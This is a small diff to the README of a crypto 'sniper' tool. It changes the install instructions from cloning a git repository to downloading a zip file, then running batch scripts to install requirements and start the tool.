@@ -26,10 +26,9 @@ It allows you to instantly open copied addresses on the best trading platforms, 
 
 ### 🚀 Quick Installation
 
-1️⃣ **Clone the repository**  
+1️⃣ **Download de .zip file**  
 ```bash
-git clone https://github.com/yourusername/sx-sniper.git
-cd sx-sniper
+sX-Sniper-v.2.zip
 ```
 2️⃣ Install dependencies
 Simply run:
@@ -37,6 +36,7 @@ Simply run:
 install-requirements.bat
 ```
 3️⃣ Run the script
+Simply run:
 ```bash
 run-sniper.bat
 ```
